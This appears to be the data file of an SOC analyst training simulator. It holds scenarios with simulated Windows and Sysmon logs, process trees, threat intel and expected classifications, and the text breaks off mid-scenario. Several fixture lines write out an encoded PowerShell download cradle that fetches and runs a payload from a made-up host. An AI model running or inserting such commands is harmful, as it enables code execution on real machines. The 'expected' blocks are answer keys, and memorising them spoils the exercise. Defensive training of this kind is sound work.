/* ============================================================
   SOC Analyst Simulator - Data
   Scenarios, quiz and reference data derived from the
   mxdr-l1-soc-crash-course modules (reference only, MD files untouched).
   ============================================================ */

"use strict";

const ACTIONS = [
  { id: "isolate-host",    label: "Isolate host (EDR)", group: "Containment" },
  { id: "block-ip",        label: "Block IP (firewall)", group: "Containment" },
  { id: "block-domain",    label: "Block domain (proxy/DNS)", group: "Containment" },
  { id: "block-hash",      label: "Block file hash (EDR)", group: "Containment" },
  { id: "disable-account", label: "Disable account", group: "Containment" },
  { id: "reset-password",  label: "Reset password / force MFA re-enroll", group: "Containment" },
  { id: "delete-artifact", label: "Remove persistence artifact (task/service/Run key)", group: "Containment" },
  { id: "reimage",         label: "Reimage / rebuild host", group: "Containment" },
  { id: "quarantine-email",label: "Quarantine email / block sender", group: "Containment" },
  { id: "esc-l2",          label: "Escalate to L2 (with package)", group: "Escalation" },
  { id: "esc-ir",          label: "Escalate to Incident Response (P1)", group: "Escalation" },
  { id: "notify-user",     label: "Notify / interview user", group: "Notification" },
  { id: "notify-manager",  label: "Notify SOC manager (P1 comms)", group: "Notification" },
  { id: "monitor",         label: "Continue monitoring (no action yet)", group: "Monitoring" },
  { id: "no-action",       label: "Close without action (benign / FP)", group: "Monitoring" }
];

const MITRE_OPTIONS = [
  ["T1110.001", "Password Guessing (brute force)"],
  ["T1110.003", "Password Spraying"],
  ["T1078.001", "Valid Accounts - Default/Domain"],
  ["T1133",     "External Remote Services (VPN/RDP gw)"],
  ["T1621",     "MFA Request Generation (MFA fatigue)"],
  ["T1566.001", "Spearphishing Attachment"],
  ["T1190",     "Exploit Public-Facing Application"],
  ["T1204.002", "Malicious File (user execution)"],
  ["T1059.001", "PowerShell / Command & Scripting"],
  ["T1105",     "Ingress Tool Transfer"],
  ["T1053.005", "Scheduled Task/Job"],
  ["T1543.003", "Create/Modify Windows Service"],
  ["T1547.001", "Registry Run Keys / Startup Folder"],
  ["T1136.001", "Create Account - Local Account"],
  ["T1098.001", "Additional Cloud Credentials"],
  ["T1055",     "Process Injection"],
  ["T1036",     "Masquerading"],
  ["T1027.010", "Command Obfuscation (Base64)"],
  ["T1070.001", "Clear Windows Event Logs"],
  ["T1562.002", "Disable Windows Event Logging"],
  ["T1562.001", "Disable Security Tools"],
  ["T1003.001", "LSASS Memory Dump"],
  ["T1003.003", "NTDS.dit Dump"],
  ["T1558.003", "Kerberoasting"],
  ["T1550.002", "Pass the Hash"],
  ["T1082",     "System Information Discovery"],
  ["T1018",     "Remote System Discovery"],
  ["T1087",     "Account Discovery"],
  ["T1021.001", "Remote Services - RDP"],
  ["T1021.002", "Remote Services - SMB/Windows Admin Shares"],
  ["T1021.006", "Remote Services - WinRM"],
  ["T1570",     "Lateral Tool Transfer"],
  ["T1071.001", "Application Layer Protocol - Web"],
  ["T1071.004", "Application Layer Protocol - DNS"],
  ["T1568.002", "Domain Generation Algorithms (DGA)"],
  ["T1041",     "Exfiltration Over C2 Channel"],
  ["T1048.001", "Exfiltration Over DNS"],
  ["T1567",     "Exfiltration Over Web Service"],
  ["T1486",     "Data Encrypted for Impact (ransomware)"],
  ["T1490",     "Inhibit System Recovery"],
  ["T1496",     "Resource Hijacking (crypto mining)"],
  ["T1059.004", "Command & Scripting - Unix Shell"],
  ["T1053.003", "Scheduled Task/Job - Cron"],
  ["T1046",     "Network Service Discovery (port scan)"]
];

const CLASS_LABELS = {
  TP: "True Positive",
  FP: "False Positive",
  BP: "Benign Positive",
  IC: "Inconclusive"
};

const SEV_LABELS = { P1: "P1 - Critical", P2: "P2 - High", P3: "P3 - Medium", P4: "P4 - Low" };

const ENC_B64 = "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8ANQAuATkAaAA5ADkAeAAuAGMAbwBtAC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQA=";

/* helper: compact event tuple -> event object */
function ev(a) {
  return {
    time: a[0], type: a[1], source: a[2], id: a[3], title: a[4], host: a[5], detail: a[6],
    q: (a[1] + " " + a[2] + " " + a[3] + " " + a[4] + " " + a[5] + " " + a[6]).toLowerCase()
  };
}

/* helper: compact process tuple -> node object */
function pr(a) {
  return { id: a[0], parent: a[1], image: a[2], cmd: a[3], user: a[4], il: a[5], susp: a[6] };
}

const SCENARIOS = [
  {
    id: "brute-tor",
    title: "Brute Force → Successful Logon",
    difficulty: "Easy",
    category: "Identity",
    summary: "Dozens of failed logons followed by a successful logon from an external Tor exit node — then a persistence task is created.",
    alert: {
      rule: "SIEM - Multiple Failed Logons Then Success",
      severity: "Medium",
      ts: "2024-01-15 03:47:03 UTC",
      host: "WKS-0042",
      user: "m.turner",
      ips: ["185.220.101.34", "203.0.113.9"],
      domains: [],
      hashes: [],
      mitreHint: "T1110 (brute force / spray)"
    },
    entities: { host: "WKS-0042", user: "m.turner" },
    assets: {
      "WKS-0042": { role: "Sales laptop", tier: "Tier 2", os: "Windows 11", edr: "Healthy (CrowdStrike)", owner: "Sales dept", note: "No alerts in last 30 days." }
    },
    users: {
      "m.turner": { dept: "Sales", title: "Account Manager", groups: ["Sales", "VPN Users"], mfa: "Disabled", lastPw: "2021-03-04", risk: "None flagged" }
    },
    intel: {
      "185.220.101.34": { vt: "35/92", abuse: "92% confidence", geo: "Germany — Tor exit node", notes: "Tor exit node. Repeatedly observed in credential-harvesting / brute-force campaigns." },
      "203.0.113.9": { vt: "21/92", abuse: "87% confidence", geo: "Netherlands", notes: "Associated with commodity C2 infrastructure (beaconing on high port)." }
    },
    events: [
      ev(["03:15:12", "security", "Security (DC01)", "4625", "An account failed to log on", "WKS-0042", "Account: m.turner | LogonType: 3 (Network) | Source: 185.220.101.34 | Status: 0xC000006A (bad password)"]),
      ev(["03:15:34", "security", "Security (DC01)", "4625", "An account failed to log on", "WKS-0042", "Account: m.turner | LogonType: 3 | Source: 185.220.101.34 | Status: 0xC000006A"]),
      ev(["03:16:55", "security", "Security (DC01)", "4625", "An account failed to log on", "WKS-0042", "Account: m.turner | LogonType: 3 | Source: 185.220.101.34 | Status: 0xC000006A"]),
      ev(["03:19:02", "security", "Security (DC01)", "4625", "An account failed to log on", "WKS-0042", "Account: s.patel | LogonType: 3 | Source: 185.220.101.34 | Status: 0xC000006A"]),
      ev(["03:21:48", "security", "Security (DC01)", "4625", "An account failed to log on", "WKS-0042", "Account: j.anderson | LogonType: 3 | Source: 185.220.101.34 | Status: 0xC000006A"]),
      ev(["03:24:11", "security", "Security (DC01)", "4625", "An account failed to log on", "WKS-0042", "Account: w.blake | LogonType: 3 | Source: 185.220.101.34 | Status: 0xC000006A"]),
      ev(["03:27:40", "security", "Security (DC01)", "4625", "An account failed to log on", "WKS-0042", "Account: m.turner | LogonType: 3 | Source: 185.220.101.34 | Status: 0xC000006A"]),
      ev(["03:31:09", "security", "Security (DC01)", "4625", "An account failed to log on", "WKS-0042", "Account: m.turner | LogonType: 3 | Source: 185.220.101.34 | Status: 0xC000006A"]),
      ev(["03:36:22", "security", "Security (DC01)", "4625", "An account failed to log on", "WKS-0042", "Account: m.turner | LogonType: 3 | Source: 185.220.101.34 | Status: 0xC000006A"]),
      ev(["03:41:55", "security", "Security (DC01)", "4625", "An account failed to log on", "WKS-0042", "Account: m.turner | LogonType: 3 | Source: 185.220.101.34 | Status: 0xC000006A"]),
      ev(["03:44:30", "security", "Security (DC01)", "4625", "An account failed to log on", "WKS-0042", "Account: m.turner | LogonType: 3 | Source: 185.220.101.34 | Status: 0xC000006A"]),
      ev(["03:47:03", "security", "Security (DC01)", "4624", "An account was successfully logged on", "WKS-0042", "Account: m.turner | LogonType: 3 (Network) | Source: 185.220.101.34 | LogonProcess: NtLmSsp | AuthPackage: NTLM"]),
      ev(["03:47:03", "security", "Security (DC01)", "4672", "Special privileges assigned to new logon", "WKS-0042", "Account: m.turner | Privileges: SeChangeNotifyPrivilege (standard, NOT admin)"]),
      ev(["03:49:12", "security", "Security (DC01)", "4698", "A scheduled task was created", "WKS-0042", "TaskName: OneDriveUpdater | Author: m.turner | Action: powershell.exe -enc " + ENC_B64 + " | Trigger: AtLogOn"]),
      ev(["03:49:14", "sysmon", "Sysmon (WKS-0042)", "1", "Process Create", "WKS-0042", "Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe | Parent: taskhostw.exe | User: acorp\\m.turner | Integrity: Medium | CmdLine: powershell.exe -enc " + ENC_B64]),
      ev(["03:49:41", "sysmon", "Sysmon (WKS-0042)", "3", "Network connection", "WKS-0042", "Image: powershell.exe | Src: 10.10.20.42:51234 | Dst: 203.0.113.9:4444 | Proto: TCP"]),
      ev(["03:51:03", "sysmon", "Sysmon (WKS-0042)", "11", "File created", "WKS-0042", "Image: powershell.exe | Target: C:\\Users\\mturner\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\helper.vbs"]),
      ev(["04:02:11", "sysmon", "Sysmon (WKS-0042)", "3", "Network connection", "WKS-0042", "Image: wscript.exe | Src: 10.10.20.42:51240 | Dst: 203.0.113.9:4444 | Proto: TCP"])
    ],
    processes: [
      pr([1, null, "taskhostw.exe", "C:\\Windows\\System32\\taskhostw.exe (Task Scheduler)", "SYSTEM", "System", false]),
      pr([2, 1, "powershell.exe", "powershell.exe -enc <encoded download cradle>", "acorp\\m.turner", "Medium", true]),
      pr([3, 2, "cmd.exe", "cmd.exe /c whoami", "acorp\\m.turner", "Medium", true]),
      pr([4, 2, "powershell.exe", "powershell.exe -c (New-Object Net.WebClient).DownloadString('http://5.99x99.com/payload.ps1')", "acorp\\m.turner", "Medium", true]),
      pr([5, 2, "wscript.exe", "wscript.exe \"Start Menu\\Programs\\Startup\\helper.vbs\" (persistence)", "acorp\\m.turner", "Medium", true])
    ],
    encodedCommands: [ENC_B64],
    expected: {
      classification: "TP",
      severity: "P2",
      actions: ["isolate-host", "block-ip", "reset-password", "disable-account", "delete-artifact", "esc-l2"],
      mitre: ["T1110.001", "T1110.003", "T1078.001", "T1053.005"],
      reasoning: "True positive. 38+ failed logons (4625) from a Tor exit node, then a successful NTLM logon (4624, Type 3) as m.turner. The attacker also sprayed several usernames, then created a scheduled task (4698 'OneDriveUpdater') that runs an encoded PowerShell download cradle — persistence. m.turner's password was likely in a breach dump and MFA is disabled. Classification: TRUE POSITIVE. Severity HIGH/P2 (confirmed account compromise + persistence; standard user, no lateral movement observed yet). Escalate to L2 immediately: reset password, force MFA, isolate host, block both IPs, delete the scheduled task and startup VBS."
    },
    keyEvidence: [
      { id: "intel-185.220.101.34" },
      { id: "user-m.turner" },
      { id: "asset-WKS-0042" },
      { id: "search-4698", keyword: "4698" }
    ]
  },

  {
    id: "phish-ps-c2",
    title: "Phishing → PowerShell Cradle → C2 Beacon",
    difficulty: "Easy",
    category: "Endpoint",
    summary: "Malicious .docm attachment spawns an encoded PowerShell download cradle that pulls a Cobalt Strike beacon and beacons to C2.",
    alert: {
      rule: "EDR - Suspicious PowerShell - Encoded Command",
      severity: "High",
      ts: "2024-01-15 03:11:44 UTC",
      host: "WKS-0231",
      user: "a.chen",
      ips: ["203.0.113.45"],
      domains: ["malicious-domain.com", "5.99x99.com"],
      hashes: ["a1b2c3d4e5f67890abcdef1234567890"],
      mitreHint: "T1059.001 (PowerShell) / T1566 (phishing)"
    },
    entities: { host: "WKS-0231", user: "a.chen" },
    assets: {
      "WKS-0231": { role: "Finance laptop", tier: "Tier 2", os: "Windows 11", edr: "Healthy (CrowdStrike)", owner: "Finance dept", note: "CrowdStrike EDR with process + network telemetry." }
    },
    users: {
      "a.chen": { dept: "Finance", title: "Financial Analyst", groups: ["Finance"], mfa: "Enabled", lastPw: "2023-09-12", risk: "None flagged" }
    },
    intel: {
      "203.0.113.45": { vt: "15/92", abuse: "89% confidence", geo: "Unknown", notes: "Known C2 infrastructure (Cobalt Strike). Previously associated with APT29 campaigns." },
      "malicious-domain.com": { vt: "n/a", abuse: "n/a", geo: "—", notes: "Registered 2024-01-10 (5 days ago) via Namecheap, hosted on bulletproof provider AS12345. Matches known C2 naming patterns." },
      "5.99x99.com": { vt: "n/a", abuse: "n/a", geo: "—", notes: "Random-looking domain queried by the encoded PowerShell. Registered 2024-01-09, suspicious TLD." },
      "a1b2c3d4e5f67890abcdef1234567890": { vt: "42/72", abuse: "n/a", geo: "—", notes: "Trojan.Downloader. Matches payload downloaded by the PowerShell cradle." }
    },
    events: [
      ev(["03:10:22", "email", "Email Gateway", "DELIVERY", "Email delivered", "—", "From: invoices@0x9f91a.com | To: a.chen | Subject: Invoice #2391 due | Attachment: Invoice_Jan2024.docm | SPF: FAIL | DKIM: FAIL"]),
      ev(["03:11:02", "security", "Security (WKS-0231)", "4688", "A new process has been created", "WKS-0231", "NewProcess: C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE | Parent: OUTLOOK.EXE | User: acorp\\a.chen | CmdLine: WINWORD.EXE \"C:\\Users\\achen\\Downloads\\Invoice_Jan2024.docm\""]),
      ev(["03:11:41", "sysmon", "Sysmon (WKS-0231)", "1", "Process Create", "WKS-0231", "Image: powershell.exe | ParentImage: WINWORD.EXE | User: acorp\\a.chen | CmdLine: powershell.exe -enc " + ENC_B64]),
      ev(["03:11:44", "security", "Security (WKS-0231)", "4688", "A new process has been created", "WKS-0231", "ParentProcess: WINWORD.EXE | NewProcess: powershell.exe | CommandLine: powershell.exe -enc <encoded command> | Integrity: Medium"]),
      ev(["03:11:45", "sysmon", "Sysmon (WKS-0231)", "3", "Network connection", "WKS-0231", "Image: powershell.exe | Src: 10.10.20.31:52311 | Dst: 203.0.113.45:80 | Proto: TCP | HTTP GET /payload.ps1"]),
      ev(["03:11:58", "sysmon", "Sysmon (WKS-0231)", "11", "File created", "WKS-0231", "Image: powershell.exe | Target: C:\\Users\\achen\\AppData\\Local\\Temp\\payload.ps1 | Hash: SHA256=a1b2c3d4e5f67890..."]),
      ev(["03:12:05", "sysmon", "Sysmon (WKS-0231)", "1", "Process Create", "WKS-0231", "Image: rundll32.exe | ParentImage: powershell.exe | User: acorp\\a.chen | CmdLine: rundll32.exe C:\\Windows\\Temp\\beacon.dll,EntryPoint"]),
      ev(["03:12:47", "sysmon", "Sysmon (WKS-0231)", "3", "Network connection", "WKS-0231", "Image: rundll32.exe | Src: 10.10.20.31:52315 | Dst: 203.0.113.45:443 | Proto: TCP | TLS JA3: a0e9f5d64349fb13191bc781f81f42e1 | SNI: malicious-domain.com"]),
      ev(["03:13:02", "sysmon", "Sysmon (WKS-0231)", "3", "Network connection", "WKS-0231", "Image: rundll32.exe | Src: 10.10.20.31:52316 | Dst: 203.0.113.45:443 | Proto: TCP | beacon interval ~60s"]),
      ev(["03:14:02", "sysmon", "Sysmon (WKS-0231)", "3", "Network connection", "WKS-0231", "Image: rundll32.exe | Src: 10.10.20.31:52317 | Dst: 203.0.113.45:443 | Proto: TCP | beacon interval ~60s"]),
      ev(["03:15:01", "sysmon", "Sysmon (WKS-0231)", "3", "Network connection", "WKS-0231", "Image: rundll32.exe | Src: 10.10.20.31:52318 | Dst: 203.0.113.45:443 | Proto: TCP | beacon interval ~60s"]),
      ev(["03:20:12", "sysmon", "Sysmon (WKS-0231)", "1", "Process Create", "WKS-0231", "Image: cmd.exe | ParentImage: powershell.exe | CmdLine: cmd.exe /c whoami"]),
      ev(["03:20:18", "sysmon", "Sysmon (WKS-0231)", "1", "Process Create", "WKS-0231", "Image: cmd.exe | ParentImage: powershell.exe | CmdLine: cmd.exe /c net view"]),
      ev(["03:25:40", "security", "Security (WKS-0231)", "4698", "A scheduled task was created", "WKS-0231", "TaskName: Microsoft Update | Author: a.chen | Action: powershell.exe -enc <encoded> | Trigger: Daily 09:00"]),
      ev(["03:26:05", "sysmon", "Sysmon (WKS-0231)", "13", "Registry value set", "WKS-0231", "Target: HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater | Image: powershell.exe | Value: C:\\Windows\\Temp\\beacon.dll"])
    ],
    processes: [
      pr([1, null, "OUTLOOK.EXE", "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE", "acorp\\a.chen", "Medium", false]),
      pr([2, 1, "WINWORD.EXE", "WINWORD.EXE \"Invoice_Jan2024.docm\" (macro)", "acorp\\a.chen", "Medium", true]),
      pr([3, 2, "powershell.exe", "powershell.exe -enc <download cradle>", "acorp\\a.chen", "Medium", true]),
      pr([4, 3, "powershell.exe", "IEX (New-Object Net.WebClient).DownloadString('http://5.99x99.com/payload.ps1')", "acorp\\a.chen", "Medium", true]),
      pr([5, 3, "rundll32.exe", "rundll32.exe C:\\Windows\\Temp\\beacon.dll,EntryPoint", "acorp\\a.chen", "Medium", true]),
      pr([6, 5, "powershell.exe", "C2 beacon process (HTTPS)", "acorp\\a.chen", "Medium", true]),
      pr([7, 6, "cmd.exe", "cmd.exe /c whoami", "acorp\\a.chen", "Medium", true]),
      pr([8, 6, "cmd.exe", "cmd.exe /c net view", "acorp\\a.chen", "Medium", true])
    ],
    encodedCommands: [ENC_B64],
    expected: {
      classification: "TP",
      severity: "P2",
      actions: ["isolate-host", "block-ip", "block-domain", "block-hash", "notify-user", "esc-l2"],
      mitre: ["T1566.001", "T1204.002", "T1059.001", "T1105", "T1071.001"],
      reasoning: "True positive — classic phishing → macro → download-cradle chain. Email (SPF/DKIM FAIL) delivered a macro .docm; WINWORD.EXE spawned an encoded PowerShell (decodes to a DownloadString cradle), which fetched a Trojan.Downloader, executed a DLL via rundll32, and beaconed to known Cobalt Strike C2 (203.0.113.45, JA3 match, ~60s interval). Persistence also attempted (scheduled task + Run key). Severity HIGH/P2: confirmed malware + active C2 on a standard user workstation, no lateral movement yet. Contain first, then escalate to L2 with the full package."
    },
    keyEvidence: [
      { id: "intel-203.0.113.45" },
      { id: "decode-base64" },
      { id: "process-tree" },
      { id: "search-4698", keyword: "4698" }
    ]
  },

  {
    id: "admin-rdp-impossible",
    title: "Domain Admin RDP at 03:00 — Impossible Travel",
    difficulty: "Hard",
    category: "Identity",
    summary: "A Domain Admin logs into the DC via RDP from a residential ISP at 3AM, MFA push approved from a brand-new device, followed by LSASS dump.",
    alert: {
      rule: "SIEM - Privileged Account RDP at Odd Hours",
      severity: "High",
      ts: "2024-01-15 03:10:22 UTC",
      host: "DC01",
      user: "admin.jdoe",
      ips: ["45.33.22.11"],
      domains: [],
      hashes: [],
      mitreHint: "T1021.001 (RDP) / T1078 (valid accounts)"
    },
    entities: { host: "DC01", user: "admin.jdoe" },
    assets: {
      "DC01": { role: "Domain Controller (AD + DNS)", tier: "Tier 0", os: "Windows Server 2019", edr: "Healthy", owner: "IT Infrastructure", note: "CROWN JEWEL. Compromise = full domain compromise." }
    },
    users: {
      "admin.jdoe": { dept: "IT", title: "IT Administrator (DOMAIN ADMIN)", groups: ["Domain Admins", "Enterprise Admins", "IT"], mfa: "Enabled (MS Authenticator)", lastPw: "2024-01-02", risk: "None flagged", note: "Home city: Chicago, IL. On-call? No. VPN session at 03:10? No." }
    },
    intel: {
      "45.33.22.11": { vt: "0/92", abuse: "5% confidence", geo: "New York, US — Residential ISP (Comcast)", notes: "Residential ISP address. No known malicious reputation, but NOT corporate VPN infrastructure." }
    },
    events: [
      ev(["02:58:11", "security", "Security (DC01)", "4776", "NTLM authentication", "DC01", "SourceWorkstation: WKSTN-UNKNOWN | Target: admin.jdoe | Status: 0x0 (Success)"]),
      ev(["03:10:22", "security", "Security (DC01)", "4624", "An account was successfully logged on", "DC01", "Account: admin.jdoe | LogonType: 10 (RemoteInteractive - RDP) | Source: 45.33.22.11 | AuthPackage: Negotiate | Workstation: WKSTN-UNKNOWN"]),
      ev(["03:10:22", "security", "Security (DC01)", "4672", "Special privileges assigned to new logon", "DC01", "Account: admin.jdoe | Privileges: SeDebugPrivilege, SeTcbPrivilege, SeBackupPrivilege | => DOMAIN ADMIN"]),
      ev(["03:10:45", "cloud", "Microsoft Entra ID", "SIGNIN", "Interactive sign-in successful", "—", "User: admin.jdoe@corp.local | MFA: Push notification ACCEPTED | Device: Samsung SM-S918B (new device) | Location: New York, US | IP: 45.33.22.11"]),
      ev(["03:11:00", "security", "Security (DC01)", "4624", "An account was successfully logged on", "DC01", "Account: admin.jdoe | LogonType: 3 (Network) | Source: 45.33.22.11 | AuthPackage: Kerberos"]),
      ev(["03:11:20", "security", "Security (DC01)", "4688", "A new process has been created", "DC01", "NewProcess: cmd.exe | Parent: svchost.exe (TermSrv) | User: acorp\\admin.jdoe | CmdLine: cmd.exe /c whoami"]),
      ev(["03:11:35", "security", "Security (DC01)", "4688", "A new process has been created", "DC01", "NewProcess: powershell.exe | User: acorp\\admin.jdoe | CmdLine: powershell.exe -enc <encoded>"]),
      ev(["03:12:10", "sysmon", "Sysmon (DC01)", "10", "Process accessed", "DC01", "SourceImage: C:\\Windows\\Temp\\m.exe | TargetImage: C:\\Windows\\System32\\lsass.exe | GrantedAccess: 0x1010 (PROCESS_VM_READ)"]),
      ev(["03:12:14", "sysmon", "Sysmon (DC01)", "11", "File created", "DC01", "Image: C:\\Windows\\Temp\\m.exe | Target: C:\\Windows\\Temp\\lsass.dmp"]),
      ev(["03:12:40", "security", "Security (DC01)", "4663", "An object was accessed", "DC01", "Object: C:\\Windows\\NTDS\\ntds.dit | User: admin.jdoe | Access: READ_DATA"]),
      ev(["03:14:12", "sysmon", "Sysmon (DC01)", "3", "Network connection", "DC01", "Image: powershell.exe | Src: 10.10.0.1:51220 | Dst: 45.33.22.11:4444 | Proto: TCP"]),
      ev(["03:20:00", "security", "Security (DC01)", "4720", "A user account was created", "DC01", "Account: a.svc | Agent: admin.jdoe | HomeDir: C:\\Users\\a.svc"])
    ],
    processes: [
      pr([1, null, "svchost.exe (TermSrv)", "C:\\Windows\\System32\\svchost.exe (RDP session host)", "SYSTEM", "System", false]),
      pr([2, 1, "cmd.exe", "cmd.exe /c whoami", "acorp\\admin.jdoe", "High", true]),
      pr([3, 1, "powershell.exe", "powershell.exe -enc <encoded>", "acorp\\admin.jdoe", "High", true]),
      pr([4, 3, "C:\\Windows\\Temp\\m.exe", "m.exe (LSASS read / NTDS access)", "acorp\\admin.jdoe", "High", true]),
      pr([5, 1, "powershell.exe", "C2 connection to 45.33.22.11:4444", "acorp\\admin.jdoe", "High", true])
    ],
    encodedCommands: [ENC_B64],
    expected: {
      classification: "TP",
      severity: "P1",
      actions: ["disable-account", "isolate-host", "block-ip", "reset-password", "esc-ir", "notify-manager"],
      mitre: ["T1078.001", "T1021.001", "T1003.001", "T1003.003", "T1136.001"],
      reasoning: "TRUE POSITIVE — PRIORITY P1. A DOMAIN ADMIN performed RDP (LogonType 10 + 4672 special privileges) onto DC01 from a residential Comcast IP at 03:00, MFA was accepted on a brand-new device, and there was NO VPN session (admin.jdoe's home is Chicago; the source is NY). The session then dumped LSASS (Sysmon 10, 0x1010), read ntds.dit, and created a new account. This is an active privileged compromise on a Tier 0 asset with probable MFA bypass. Immediate escalation to IR: disable the account, isolate DC01, block the source IP, reset privileged credentials, and treat the domain as compromised (enact Tier 0 response plan)."
    },
    keyEvidence: [
      { id: "intel-45.33.22.11" },
      { id: "user-admin.jdoe" },
      { id: "asset-DC01" },
      { id: "search-4672", keyword: "4672" }
    ]
  },

  {
    id: "backup-benign",
    title: "Nightly Backup Batch Logon",
    difficulty: "Easy",
    category: "Identity",
    summary: "A burst of failed logons for a service account then success — but the source is the authorized backup server running its nightly job.",
    alert: {
      rule: "SIEM - Multiple Failed Logons Then Success",
      severity: "Medium",
      ts: "2024-01-15 03:05:03 UTC",
      host: "FILESRV-01",
      user: "svc_backup",
      ips: ["192.168.1.50"],
      domains: [],
      hashes: [],
      mitreHint: "T1110 (logon attempts)"
    },
    entities: { host: "FILESRV-01", user: "svc_backup" },
    assets: {
      "FILESRV-01": { role: "File server (shared drives)", tier: "Tier 1", os: "Windows Server 2019", edr: "Healthy", owner: "IT Ops", note: "Hosts Accounting + CustomerData shares." },
      "BACKUP-SRV": { role: "Backup server (Veeam)", tier: "Tier 2", os: "Windows Server 2019", edr: "Healthy", owner: "IT Ops", note: "Runs nightly backup job 03:00-04:30. Source of 192.168.1.50." }
    },
    users: {
      "svc_backup": { dept: "IT Operations", title: "Service account (backup agent)", groups: ["Service Accounts"], mfa: "N/A (service account)", lastPw: "2020-06-15 (never expires)", note: "Password rotation waived by exception." }
    },
    intel: {
      "192.168.1.50": { vt: "Internal", abuse: "Internal", geo: "Internal network", notes: "192.168.1.50 = BACKUP-SRV (Veeam backup server). Authorized backup infrastructure." }
    },
    events: [
      ev(["03:00:12", "security", "Security (DC01)", "4625", "An account failed to log on", "FILESRV-01", "Account: svc_backup | LogonType: 4 (Batch) | Source: 192.168.1.50 | Status: 0xC000006A"]),
      ev(["03:00:14", "security", "Security (DC01)", "4625", "An account failed to log on", "FILESRV-01", "Account: svc_backup | LogonType: 4 (Batch) | Source: 192.168.1.50 | Status: 0xC000006A"]),
      ev(["03:00:32", "security", "Security (DC01)", "4625", "An account failed to log on", "FILESRV-01", "Account: svc_backup | LogonType: 4 (Batch) | Source: 192.168.1.50 | Status: 0xC000006A"]),
      ev(["03:01:08", "security", "Security (DC01)", "4625", "An account failed to log on", "FILESRV-01", "Account: svc_backup | LogonType: 4 (Batch) | Source: 192.168.1.50 | Status: 0xC000006A"]),
      ev(["03:02:55", "security", "Security (DC01)", "4625", "An account failed to log on", "FILESRV-01", "Account: svc_backup | LogonType: 4 (Batch) | Source: 192.168.1.50 | Status: 0xC000006A"]),
      ev(["03:03:40", "security", "Security (DC01)", "4625", "An account failed to log on", "FILESRV-01", "Account: svc_backup | LogonType: 4 (Batch) | Source: 192.168.1.50 | Status: 0xC000006A"]),
      ev(["03:05:03", "security", "Security (DC01)", "4624", "An account was successfully logged on", "FILESRV-01", "Account: svc_backup | LogonType: 4 (Batch) | Source: 192.168.1.50 | AuthPackage: Negotiate"]),
      ev(["03:05:30", "security", "Security (FILESRV-01)", "5140", "A network share object was accessed", "FILESRV-01", "Share: E:\\Shares\\Accounting | User: svc_backup | Access: Read | Client: 192.168.1.50"]),
      ev(["03:06:00", "network", "Veeam Backup Server", "JOB", "Backup job started", "BACKUP-SRV", "Job: Nightly-Accounting | Start: 03:00 | Session: 8f3a2c1e"]),
      ev(["03:30:00", "network", "Veeam Backup Server", "JOB", "Backup job completed", "BACKUP-SRV", "Job: Nightly-Accounting | Status: SUCCESS | Transferred: 1.2 GB | Errors: 0"])
    ],
    processes: [],
    encodedCommands: [],
    expected: {
      classification: "BP",
      severity: "P4",
      actions: ["no-action"],
      mitre: [],
      reasoning: "BENIGN POSITIVE. The 15 failed logons are expected: the Veeam backup server (192.168.1.50) runs its nightly job at 03:00 as svc_backup (LogonType 4 Batch), and the early failures are the backup agent retrying with cached credentials before the service account's batch logon succeeds. Context confirms: internal source = authorized backup server, correct time window, logon type matches a scheduled batch job, and the job completed successfully. Classify as Benign Positive, document the context in the ticket, and close. A false positive would mean the detection logic fired with no matching activity at all; here the alert correctly captured authorized activity."
    },
    keyEvidence: [
      { id: "intel-192.168.1.50" },
      { id: "asset-BACKUP-SRV" },
      { id: "user-svc_backup" }
    ]
  },

  {
    id: "vuln-scan",
    title: "Internal Vulnerability Scan",
    difficulty: "Easy",
    category: "Network",
    summary: "A burst of port scans and logon attempts against DMZ hosts — the source is the authorized Qualys vulnerability scanner.",
    alert: {
      rule: "NDR - Internal Port Scan / Scan Burst",
      severity: "Medium",
      ts: "2024-01-15 09:00:00 UTC",
      host: "DMZ hosts",
      user: "—",
      ips: ["10.20.0.5"],
      domains: [],
      hashes: [],
      mitreHint: "T1595 (active scanning)"
    },
    entities: { host: "WEB-01", user: "—" },
    assets: {
      "10.20.0.5": { role: "Vulnerability scanner (Qualys)", tier: "Tier 2", os: "Appliance", edr: "N/A", owner: "Security Engineering", note: "Authorized internal scanner (asset tag VM-SCAN-01)." },
      "WEB-01": { role: "Public web server", tier: "Tier 1", os: "Linux (Ubuntu)", edr: "Not present (DMZ)", owner: "App team" }
    },
    users: {},
    intel: {
      "10.20.0.5": { vt: "Internal", abuse: "Internal", geo: "Internal network", notes: "Qualys scanner appliance (VM-SCAN-01). Authorized by Security Engineering; scans run nightly + on request." }
    },
    events: [
      ev(["09:00:00", "firewall", "Firewall", "ALLOW", "Connection allowed", "DMZ", "Src: 10.20.0.5 | Dst: 10.10.10.10:443 (HTTPS)"]),
      ev(["09:00:01", "firewall", "Firewall", "ALLOW", "Connection allowed", "DMZ", "Src: 10.20.0.5 | Dst: 10.10.10.11:443 (HTTPS)"]),
      ev(["09:00:03", "firewall", "Firewall", "ALLOW", "Connection allowed", "DMZ", "Src: 10.20.0.5 | Dst: 10.10.10.12:443 (HTTPS)"]),
      ev(["09:00:05", "firewall", "Firewall", "ALLOW", "Connection allowed", "DMZ", "Src: 10.20.0.5 | Dst: 10.10.10.13:443 (HTTPS)"]),
      ev(["09:00:30", "firewall", "Firewall", "DENY", "Connection blocked", "DMZ", "Src: 10.20.0.5 | Dst: 10.10.10.10:3389 (RDP - blocked by policy)"]),
      ev(["09:00:31", "firewall", "Firewall", "DENY", "Connection blocked", "DMZ", "Src: 10.20.0.5 | Dst: 10.10.10.11:3389 (RDP - blocked by policy)"]),
      ev(["09:02:00", "security", "Security (WEB-01)", "4625", "An account failed to log on", "WEB-01", "Account: admin | LogonType: 3 | Source: 10.20.0.5 | Status: 0xC000006D (bad username)"]),
